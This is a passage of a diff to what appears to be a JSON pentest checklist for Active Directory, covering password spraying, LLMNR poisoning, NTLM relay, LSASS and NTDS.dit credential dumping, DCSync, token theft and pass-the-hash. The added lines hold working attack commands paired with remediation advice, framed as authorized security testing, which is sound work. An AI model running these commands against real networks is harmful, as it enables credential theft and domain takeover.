+          "how_to_fix": "Defensively: set sane lockout thresholds + observation windows, enable Azure AD Smart Lockout / extranet lockout on ADFS, and alert on spray patterns (one password, many accounts). This is a safety + defense control.",
           "tools": [
             "netexec/crackmapexec",
             "PowerView",
@@ -933,8 +933,8 @@
           "title": "Build a valid username list",
           "description": "Generate and validate usernames via LDAP enumeration, kerbrute user enumeration, or OSINT-derived naming conventions.",
           "severity": "low",
-          "how_to_find": "Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: You have a deduplicated list of confirmed-valid enabled usernames",
-          "how_to_fix": "Assign an owner for build a valid username list, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Enumerate/validate usernames:\n\n```\nnxc smb <dc-ip> -u <user> -p <pass> --users\nkerbrute userenum -d <domain> --dc <dc-ip> users.txt\n```",
+          "how_to_fix": "Recon step. Defensively: reduce username enumeration exposure (consistent responses on OWA/ADFS/Kerberos), avoid predictable naming for privileged accounts, and monitor enumeration.",
           "tools": [
             "kerbrute",
             "impacket (GetADUsers)",
@@ -961,8 +961,8 @@
           "title": "Execute lockout-aware spray",
           "description": "Spray one candidate password per round across all users (seasonal passwords, Company123, Welcome1, etc.), then wait out the observation window before the next round.",
           "severity": "high",
-          "how_to_find": "Validate execute lockout-aware spray in Authentication Attacks — Password Spraying. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for execute lockout-aware spray, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Spray one password across accounts, respecting lockout:\n\n```\nkerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Season2024!'\nnxc smb <dc-ip> -u users.txt -p 'Season2024!' --continue-on-success\n```",
+          "how_to_fix": "Enforce strong/banned-password policies + MFA, Smart Lockout, and alert on distributed spray. Rotate any hit. Re-test that weak seasonal passwords fail.",
           "tools": [
             "netexec/crackmapexec",
             "kerbrute",
@@ -989,8 +989,8 @@
           "title": "Validate hits and map privileges",
           "description": "Confirm each valid credential against SMB/LDAP/WinRM, check for password reuse across accounts, and map the access each credential grants for the next phase.",
           "severity": "high",
-          "how_to_find": "Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Authentication Attacks — Password Spraying: Confirm each valid credential against SMB/LDAP/WinRM, check for password reuse across accounts, and map the access each credential grants for the next phase",
-          "how_to_fix": "Assign an owner for validate hits and map privileges, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "For each hit, check access and group membership:\n\n```\nnxc smb <targets> -u <hit> -p <pass> --shares\nnxc ldap <dc-ip> -u <hit> -p <pass> --groups\n```",
+          "how_to_fix": "Rotate compromised passwords, enforce MFA, apply least privilege (many sprayed hits are over-privileged), and review admin membership. Re-test the old password fails.",
           "tools": [
             "netexec/crackmapexec",
             "BloodHound"
@@ -1016,8 +1016,8 @@
           "title": "Spray external services (OWA/ADFS/VPN)",
           "description": "Where in scope, spray internet-facing authentication endpoints (Outlook Web Access, ADFS, VPN, O365) which often share AD credentials and may have weaker lockout monitoring.",
           "severity": "high",
-          "how_to_find": "Validate spray external services (owa/adfs/vpn) in Authentication Attacks — Password Spraying. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for spray external services (owa/adfs/vpn), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Spray internet-facing auth portals (authorized):\n\n```\n# tools like MailSniper/o365spray/fireprox-fronted spraying against OWA/ADFS/VPN\n```",
+          "how_to_fix": "Require MFA on all external services, enable extranet Smart Lockout, restrict access by geo/conditional access, and monitor for spray. Re-test external spray is blocked by MFA.",
           "tools": [
             "netexec/crackmapexec",
             "MailSniper",
@@ -1049,8 +1049,8 @@
           "title": "Poison LLMNR/NBT-NS/mDNS to capture NetNTLM",
           "description": "Run Responder to answer broadcast name-resolution queries.",
           "severity": "high",
-          "how_to_find": "Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Run Responder to answer broadcast name-resolution queries",
-          "how_to_fix": "Assign an owner for poison llmnr/nbt-ns/mdns to capture netntlm, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Respond to broadcast name resolution to capture hashes:\n\n```\nresponder -I <iface> -wv\n```\n\nCaptured NetNTLMv2 = high finding.",
+          "how_to_fix": "Disable LLMNR (GPO: Turn off multicast name resolution), disable NBT-NS on adapters (DHCP option/script), disable mDNS where unused, and ensure DNS is correct. Re-run Responder to confirm no captures.",
           "tools": [
             "Responder"
           ],
@@ -1075,8 +1075,8 @@
           "title": "Crack captured NetNTLMv2 hashes",
           "description": "Crack captured NetNTLMv2 hashes offline with hashcat (mode 5600) and rules.",
           "severity": "high",
-          "how_to_find": "Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning: A captured hash is cracked to plaintext or the cracking attempt is documented as exhausted",
-          "how_to_fix": "Assign an owner for crack captured netntlmv2 hashes, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Crack offline:\n\n```\nhashcat -m 5600 netntlm.txt rockyou.txt -r best64.rule\n```",
+          "how_to_fix": "Enforce strong passwords so cracking fails, and remove the capture source (disable LLMNR/NBT-NS). Rotate cracked accounts. Prefer relaying mitigations (signing) too. Re-attempt cracking.",
           "tools": [
             "hashcat",
             "john"
@@ -1102,8 +1102,8 @@
           "title": "Relay captured authentication instead of cracking",
           "description": "When SMB signing is not enforced, relay the coerced NetNTLM authentication to other hosts with ntlmrelayx instead of cracking it, executing commands or dumping SAM as the authenticating user.",
           "severity": "critical",
-          "how_to_find": "Validate relay captured authentication instead of cracking in Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for relay captured authentication instead of cracking, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Relay instead of crack (no password needed):\n\n```\n# Responder off for SMB/HTTP, then:\nntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'\n```\n\nSuccessful relay = critical.",
+          "how_to_fix": "Require SMB signing (and LDAP signing + channel binding), enable EPA on web/ADCS, disable NTLM where possible, and kill the capture source (LLMNR/NBT-NS). Re-test relay fails.",
           "tools": [
             "Responder",
             "impacket (ntlmrelayx)"
@@ -1129,8 +1129,8 @@
           "title": "Inventory hosts without SMB signing",
           "description": "Scan the network for hosts where SMB signing is not required.",
           "severity": "medium",
-          "how_to_find": "Validate inventory hosts without smb signing in Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for inventory hosts without smb signing, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find relay targets (signing not required):\n\n```\nnxc smb <range> --gen-relay-list relay.txt\n```",
+          "how_to_fix": "Require SMB signing via GPO on all servers and clients, prioritizing DCs and high-value hosts. Re-scan to confirm signing is required everywhere.",
           "tools": [
             "netexec/crackmapexec",
             "nmap",
@@ -1157,8 +1157,8 @@
           "title": "Coerce authentication via RPC/printer triggers",
           "description": "Actively coerce machine-account authentication using PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), or DFSCoerce to drive relayable authentications from privileged hosts on demand.",
           "severity": "high",
-          "how_to_find": "Validate coerce authentication via rpc/printer triggers in Authentication Attacks — LLMNR/NBT-NS/mDNS Poisoning. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for coerce authentication via rpc/printer triggers, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Force a target (e.g. a DC) to authenticate to you:\n\n```\ncoercer coerce -u <user> -p <pass> -t <dc-ip> -l <listener-ip>\n# PetitPotam / PrinterBug / DFSCoerce\n```\n\nCoerced DC auth relayed to ADCS/LDAP = critical.",
+          "how_to_fix": "Patch coercion vectors (PetitPotam/PrintNightmare updates), disable the Print Spooler on DCs, require SMB/LDAP signing + EPA, and block relay paths (esp. to ADCS ESC8). Re-test coercion + relay fails.",
           "tools": [
             "PetitPotam",
             "Coercer",
@@ -1191,8 +1191,8 @@
           "title": "Dump LSASS process memory",
           "description": "Create a memory dump of lsass.exe via comsvcs.dll MiniDump, Task Manager, procdump, or a custom dumper.",
           "severity": "high",
-          "how_to_find": "Validate dump lsass process memory in Credential Access — LSASS Dumping & Credential Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for dump lsass process memory, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Dump LSASS (authorized, on a compromised host):\n\n```\nnxc smb <ip> -u <user> -p <pass> -M lsassy\n# or comsvcs MiniDump / procdump -ma lsass.exe\n```",
+          "how_to_fix": "Enable Credential Guard + LSA protection (RunAsPPL), deploy EDR to block LSASS access, restrict local admin, and use tiered admin so high-value creds never land on low-tier hosts. Re-test dumping is blocked.",
           "tools": [
             "Mimikatz",
             "procdump",
@@ -1220,8 +1220,8 @@
           "title": "Parse dump for secrets with Mimikatz/pypykatz",
           "description": "Parse the LSASS dump offline with pypykatz or Mimikatz sekurlsa to extract NT hashes, plaintext passwords (where WDigest/credentials cached), Kerberos tickets, and DPAPI master keys.",
           "severity": "critical",
-          "how_to_find": "Validate parse dump for secrets with mimikatz/pypykatz in Credential Access — LSASS Dumping & Credential Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for parse dump for secrets with mimikatz/pypykatz, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Extract creds from the dump:\n\n```\npypykatz lsa minidump lsass.dmp\n# or mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords\n```",
+          "how_to_fix": "Same as LSASS protection: Credential Guard, RunAsPPL, EDR, tiering, and disable WDigest (`UseLogonCredential=0`) so plaintext isn't present. Rotate exposed creds. Re-verify.",
           "tools": [
             "Mimikatz",
             "pypykatz"
@@ -1247,8 +1247,8 @@
           "title": "Dump SAM and LSA secrets",
           "description": "Extract local SAM hashes and LSA secrets (cached domain credentials, service account passwords, DPAPI keys) from the registry hives, providing local admin hashes and additional domain credentials.",
           "severity": "high",
-          "how_to_find": "Validate dump sam and lsa secrets in Credential Access — LSASS Dumping & Credential Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for dump sam and lsa secrets, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Dump local SAM + LSA secrets (local accounts, service creds, cached):\n\n```\nnxc smb <ip> -u <user> -p <pass> --sam --lsa\nsecretsdump.py <domain>/<user>:<pass>@<ip>\n```",
+          "how_to_fix": "Use LAPS (unique local admin passwords), limit cached logons (`CachedLogonsCount`), protect service-account creds (gMSA), and enable Credential Guard. Rotate exposed secrets. Re-test.",
           "tools": [
             "impacket (secretsdump)",
             "netexec/crackmapexec",
@@ -1275,8 +1275,8 @@
           "title": "Decrypt DPAPI-protected secrets",
           "description": "Use recovered DPAPI master keys to decrypt saved browser passwords, RDP credentials, Wi-Fi keys, and the credential vault, expanding the credential set far beyond what LSASS held directly.",
           "severity": "high",
-          "how_to_find": "Validate decrypt dpapi-protected secrets in Credential Access — LSASS Dumping & Credential Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for decrypt dpapi-protected secrets, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Loot DPAPI-protected browser/creds vault secrets:\n\n```\nsecretsdump.py -dpapi ...   # or mimikatz dpapi:: / SharpDPAPI\n```",
+          "how_to_fix": "Limit local admin (needed to reach masterkeys), enable Credential Guard, protect the domain DPAPI backup key on DCs, and use EDR. Rotate exposed secrets. Re-verify.",
           "tools": [
             "Mimikatz",
             "impacket (dpapi)",
@@ -1303,8 +1303,8 @@
           "title": "Harvest Kerberos tickets from memory",
           "description": "Export TGTs and TGS tickets from LSASS for Pass-the-Ticket reuse.",
           "severity": "high",
-          "how_to_find": "Validate harvest kerberos tickets from memory in Credential Access — LSASS Dumping & Credential Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for harvest kerberos tickets from memory, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Extract TGT/TGS for pass-the-ticket:\n\n```\nRubeus.exe dump /nowrap\n# or mimikatz sekurlsa::tickets /export\n```",
+          "how_to_fix": "Enable Credential Guard (protects tickets), restrict where privileged accounts log on (tiering), add them to Protected Users, and shorten ticket lifetimes. Re-test ticket harvesting is blocked.",
           "tools": [
             "Mimikatz",
             "Rubeus"
@@ -1335,8 +1335,8 @@
           "title": "Confirm replication rights",
           "description": "Verify the current principal holds DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object.",
           "severity": "high",
-          "how_to_find": "Credential Access — DCSync Replication Attack: Credential Access — DCSync Replication Attack: Credential Access — DCSync Replication Attack: Credential Access — DCSync Replication Attack: Credential Access — DCSync Replication Attack: You confirm the current identity holds both replication extended rights",
-          "how_to_fix": "Assign an owner for confirm replication rights, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Check which principals hold `Get-Changes`/`Get-Changes-All`:\n\n```\nGet-DomainObjectAcl \"DC=corp,DC=local\" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get-Changes'}\n```",
+          "how_to_fix": "Remove replication rights from any non-DC/non-admin principal, monitor DACL changes on the domain object, and alert on DCSync (event 4662 with the replication GUIDs). Re-audit.",
           "tools": [
             "PowerView",
             "BloodHound"
@@ -1362,8 +1362,8 @@
           "title": "DCSync the krbtgt account",
           "description": "Replicate the krbtgt account hash, which is the signing key for all Kerberos TGTs.",
           "severity": "critical",
-          "how_to_find": "Validate dcsync the krbtgt account in Credential Access — DCSync Replication Attack. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for dcsync the krbtgt account, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Replicate the krbtgt hash (enables Golden Tickets):\n\n```\nsecretsdump.py -just-dc-user krbtgt <domain>/<user>:<pass>@<dc-ip>\n# or mimikatz lsadump::dcsync /user:krbtgt\n```",
+          "how_to_fix": "Restrict replication rights to DCs/authorized admins, monitor 4662 for replication GUIDs from non-DCs, and if krbtgt is exposed rotate it twice. Re-verify only DCs can DCSync.",
           "tools": [
             "impacket (secretsdump)",
             "Mimikatz"
@@ -1389,8 +1389,8 @@
           "title": "DCSync specific high-value accounts",
           "description": "Replicate the credentials of targeted accounts (Domain Admins, service accounts) rather than the full domain to reduce noise while still obtaining the hashes you need.",
           "severity": "critical",
-          "how_to_find": "Validate dcsync specific high-value accounts in Credential Access — DCSync Replication Attack. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for dcsync specific high-value accounts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Pull specific accounts (e.g. a Domain Admin):\n\n```\nsecretsdump.py -just-dc-user <target> <domain>/<user>:<pass>@<dc-ip>\n```",
+          "how_to_fix": "Remove excessive replication rights, tier admins, add high-value accounts to Protected Users, rotate exposed hashes, and alert on DCSync. Re-audit.",
           "tools": [
             "impacket (secretsdump)",
             "Mimikatz"
@@ -1416,8 +1416,8 @@
           "title": "DCSync the entire domain credential set",
           "description": "When full compromise is authorized, replicate every account hash from the DC for password reuse analysis and complete credential mapping across the domain.",
           "severity": "critical",
-          "how_to_find": "Validate dcsync the entire domain credential set in Credential Access — DCSync Replication Attack. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for dcsync the entire domain credential set, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Dump all domain hashes via replication:\n\n```\nsecretsdump.py -just-dc <domain>/<user>:<pass>@<dc-ip>\n```",
+          "how_to_fix": "This implies full domain compromise: restrict replication rights, investigate how the rights were obtained, force a domain-wide password reset (incl. krbtgt x2), and monitor DCSync. Re-audit replication ACLs.",
           "tools": [
             "impacket (secretsdump)",
             "Mimikatz"
@@ -1443,8 +1443,8 @@
           "title": "Abuse delegated replication grants from low privilege",
           "description": "If a non-DA principal you control was granted replication rights (often via a misconfigured ACL or after WriteDACL abuse), perform DCSync from that account to escalate without ever holding DA directly.",
           "severity": "critical",
-          "how_to_find": "Validate abuse delegated replication grants from low privilege in Credential Access — DCSync Replication Attack. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse delegated replication grants from low privilege, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "If a low-priv principal was granted replication (misconfig/ACL abuse), use it directly:\n\n```\nsecretsdump.py -just-dc <domain>/<lowpriv>:<pass>@<dc-ip>\n```",
+          "how_to_fix": "Remove replication rights from low-priv principals, audit how they were granted (WriteDacl chains), restore the domain object DACL, and alert on 4662. Re-verify.",
           "tools": [
             "impacket (secretsdump)",
             "PowerView",
@@ -1476,8 +1476,8 @@
           "title": "Copy NTDS.dit via Volume Shadow Copy",
           "description": "Since NTDS.dit is locked while in use, create a Volume Shadow Copy (vssadmin/diskshadow/wmic) and copy the database plus the SYSTEM hive from the snapshot for offline parsing.",
           "severity": "critical",
-          "how_to_find": "Validate copy ntds.dit via volume shadow copy in Credential Access — NTDS.dit Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for copy ntds.dit via volume shadow copy, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "On a DC, snapshot and copy the database + SYSTEM hive:\n\n```\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\...\\Windows\\NTDS\\ntds.dit C:\\temp\\\nreg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n```",
+          "how_to_fix": "DC compromise: restrict Domain Admin / DC logon (tiering), enable Credential Guard, monitor VSS usage on DCs, and protect backups. If exposed, reset all credentials (krbtgt x2). Investigate the initial access.",
           "tools": [
             "vssadmin",
             "diskshadow",
@@ -1505,8 +1505,8 @@
           "title": "Extract hashes remotely with secretsdump",
           "description": "Use impacket secretsdump with DA credentials to remotely dump NTDS over DRSUAPI (effectively DCSync) or via VSS, avoiding manual file copying.",
           "severity": "critical",
-          "how_to_find": "Validate extract hashes remotely with secretsdump in Credential Access — NTDS.dit Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for extract hashes remotely with secretsdump, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Remotely dump domain hashes (DRSUAPI or VSS):\n\n```\nsecretsdump.py <domain>/<da-user>:<pass>@<dc-ip>\n```",
+          "how_to_fix": "Restrict who holds DC-admin/replication rights, monitor DCSync/VSS, enable Credential Guard, and rotate exposed hashes. Re-audit privileged access.",
           "tools": [
             "impacket (secretsdump)",
             "netexec/crackmapexec"
@@ -1532,8 +1532,8 @@
           "title": "Parse NTDS.dit offline",
           "description": "Parse the copied NTDS.dit and SYSTEM hive offline with secretsdump or DSInternals to extract NT hashes, password history, and Kerberos keys without further DC interaction.",
           "severity": "high",
-          "how_to_find": "Validate parse ntds.dit offline in Credential Access — NTDS.dit Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for parse ntds.dit offline, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Parse the copied database offline:\n\n```\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n```",
+          "how_to_fix": "Protect NTDS.dit/backups (encryption, restricted access), tier DC administration, and rotate credentials if exposed. Re-verify backup access controls.",
           "tools": [
             "impacket (secretsdump)",
             "DSInternals"
@@ -1559,8 +1559,8 @@
           "title": "Extract and analyze password history",
           "description": "Dump historical password hashes from NTDS to identify password rotation patterns and predictable schemes, which can reveal current passwords or reuse across accounts.",
           "severity": "medium",
-          "how_to_find": "Validate extract and analyze password history in Credential Access — NTDS.dit Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for extract and analyze password history, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Dump history to assess password reuse/patterns:\n\n```\nsecretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL\n```",
+          "how_to_fix": "Enforce password history + banned-password lists (Azure AD Password Protection), discourage predictable rotations, and rotate reused credentials. Re-assess after policy change.",
           "tools": [
             "impacket (secretsdump)",
             "DSInternals"
@@ -1586,8 +1586,8 @@
           "title": "Crack and analyze domain hashes",
           "description": "Crack the recovered NTDS hashes offline and produce password reuse and weakness statistics.",
           "severity": "medium",
-          "how_to_find": "Validate crack and analyze domain hashes in Credential Access — NTDS.dit Extraction. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for crack and analyze domain hashes, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Crack NT hashes and analyze weak/shared passwords:\n\n```\nhashcat -m 1000 nt-hashes.txt rockyou.txt -r best64.rule\n# then pass the pot to DPAT for stats\n```",
+          "how_to_fix": "Enforce strong/banned passwords + length, deploy fine-grained policies for admins, rotate cracked/reused accounts, and consider MFA. Re-crack to measure improvement.",
           "tools": [
             "hashcat",
             "john"
@@ -1618,8 +1618,8 @@
           "title": "Enumerate available tokens and privileges",
           "description": "List logged-on users and their tokens, and check the current token privileges (notably SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege) that enable impersonation or escalation.",
           "severity": "medium",
-          "how_to_find": "Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: You can list impersonatable tokens and confirm which sensitive privileges the current token holds",
-          "how_to_fix": "Assign an owner for enumerate available tokens and privileges, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "List tokens/privileges on a compromised host:\n\n```\n# mimikatz: token::list\nwhoami /priv    # look for SeImpersonate/SeAssignPrimaryToken/SeDebug\n```",
+          "how_to_fix": "Apply least privilege (remove SeImpersonate/SeDebug from service accounts where not required), tier admin logons, and deploy EDR. Re-audit assigned privileges.",
           "tools": [
             "Mimikatz",
             "incognito",
@@ -1646,8 +1646,8 @@
           "title": "Steal and impersonate a delegation token",
           "description": "Impersonate the token of a more privileged logged-on user (e.g., a Domain Admin with a session on the host) to execute commands in their context without their password.",
           "severity": "high",
-          "how_to_find": "Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: You execute a command as the impersonated user (whoami confirms the new identity)",
-          "how_to_fix": "Assign an owner for steal and impersonate a delegation token, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Impersonate a more-privileged user's token present on the host:\n\n```\n# mimikatz: token::elevate  (or Incognito: list_tokens / impersonate_token)\n```",
+          "how_to_fix": "Prevent privileged accounts from logging onto lower-tier hosts (tiering, Deny-logon GPOs), enable Credential Guard, and use RestrictedAdmin RDP. Re-assess where privileged tokens land.",
           "tools": [
             "Mimikatz",
             "incognito",
@@ -1674,8 +1674,8 @@
           "title": "Escalate via Potato attacks (SeImpersonate)",
           "description": "On a service account with SeImpersonatePrivilege, use a Potato attack (RoguePotato, JuicyPotato, PrintSpoofer, GodPotato) to coerce SYSTEM authentication and impersonate the SYSTEM token for local privilege escalation.",
           "severity": "high",
-          "how_to_find": "Validate escalate via potato attacks (seimpersonate) in Credential Access — Token Theft & Impersonation. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for escalate via potato attacks (seimpersonate), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With `SeImpersonate` (common on service accounts), escalate to SYSTEM:\n\n```\n# JuicyPotatoNG / PrintSpoofer / GodPotato\nPrintSpoofer.exe -i -c cmd\n```",
+          "how_to_fix": "Remove `SeImpersonate`/`SeAssignPrimaryToken` from accounts that don't need it, patch the host, deploy EDR, and least-privilege service accounts. Re-test the potato fails.",
           "tools": [
             "PrintSpoofer",
             "GodPotato",
@@ -1702,8 +1702,8 @@
           "title": "Create logon tokens from known credentials",
           "description": "Use make_token / runas with captured credentials to spawn a process with an alternate logon token, enabling network authentication as another user without an interactive logon.",
           "severity": "medium",
-          "how_to_find": "Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: Credential Access — Token Theft & Impersonation: A process runs under the alternate credential and can authenticate to network resources",
-          "how_to_fix": "Assign an owner for create logon tokens from known credentials, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Create a token/session from known creds for lateral use:\n\n```\nrunas /netonly /user:<domain>\\<user> cmd\n# or mimikatz sekurlsa::pth for hash-based\n```",
+          "how_to_fix": "Rotate exposed creds, enforce MFA, and restrict privileged-account usage to hardened admin workstations. Re-test the old creds fail.",
           "tools": [
             "Mimikatz",
             "runas",
@@ -1730,8 +1730,8 @@
           "title": "Revert impersonation and manage artifacts",
           "description": "Revert to self after impersonation and ensure no orphaned tokens, scheduled tasks, or credential artifacts remain, keeping the engagement clean and avoiding detection from leftover sessions.",
           "severity": "low",
-          "how_to_find": "Validate revert impersonation and manage artifacts in Credential Access — Token Theft & Impersonation. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for revert impersonation and manage artifacts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Revert to self and record artifacts created during testing:\n\n```\n# mimikatz: token::revert\n```",
+          "how_to_fix": "Process step: revert impersonation, log all created tokens/sessions/accounts, and remove artifacts after testing. Provides a clean, auditable engagement.",
           "tools": [
             "Mimikatz",
             "incognito"
@@ -1762,8 +1762,8 @@
           "title": "Validate NT hashes across hosts",
           "description": "Spray a recovered NT hash across the network to identify where it grants local admin or access.",
           "severity": "high",
-          "how_to_find": "Validate validate nt hashes across hosts in Lateral Movement — Pass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for validate nt hashes across hosts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Test where an NT hash grants access:\n\n```\nnxc smb <range> -u <user> -H <nthash> --continue-on-success\n```\n\n`Pwn3d!` on multiple hosts = high (hash reuse).",
+          "how_to_fix": "Deploy LAPS (unique local admin passwords), restrict local admin, enable Credential Guard, use Protected Users + tiering, and require SMB signing. Rotate exposed hashes. Re-test PtH fails.",
           "tools": [
             "netexec/crackmapexec",
             "impacket"
@@ -1789,8 +1789,8 @@
           "title": "Execute commands via PtH",
           "description": "Use the hash with psexec/wmiexec/smbexec-style impacket tools or netexec to execute commands on hosts where it grants admin, without ever recovering plaintext.",
           "severity": "high",
-          "how_to_find": "Validate execute commands via pth in Lateral Movement — Pass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for execute commands via pth, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Run commands using the hash:\n\n```\nnxc smb <ip> -u <user> -H <nthash> -x \"whoami\"\nwmiexec.py -hashes :<nthash> <domain>/<user>@<ip>\n```",
+          "how_to_fix": "Same as PtH controls: LAPS, Credential Guard, tiering, least local-admin, SMB signing. Rotate the exposed hash (change password). Re-test.",
           "tools": [
             "impacket (psexec/wmiexec)",
             "netexec/crackmapexec",
@@ -1817,8 +1817,8 @@
           "title": "Exploit local admin hash reuse",
           "description": "Identify shared local Administrator password hashes (where LAPS is absent) and pass them across all matching hosts.",
           "severity": "high",
-          "how_to_find": "Lateral Movement — Pass-the-Hash: Lateral Movement — Pass-the-Hash: Lateral Movement — Pass-the-Hash: Lateral Movement — Pass-the-Hash: Lateral Movement — Pass-the-Hash: You confirm whether the local admin hash is reused and map the set of hosts it unlocks",
-          "how_to_fix": "Assign an owner for exploit local admin hash reuse, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Spray a local admin hash across the estate:\n\n```\nnxc smb <range> -u administrator -H <local-admin-hash> --local-auth --continue-on-success\n```",
+          "how_to_fix": "Deploy LAPS so every local admin password/hash is unique, disable/limit the local admin account, and enable network-logon restrictions for local accounts. Re-test reuse fails.",
           "tools": [
             "netexec/crackmapexec",
             "impacket (secretsdump)"
@@ -1844,8 +1844,8 @@
           "title": "Overpass-the-Hash to a Kerberos TGT",
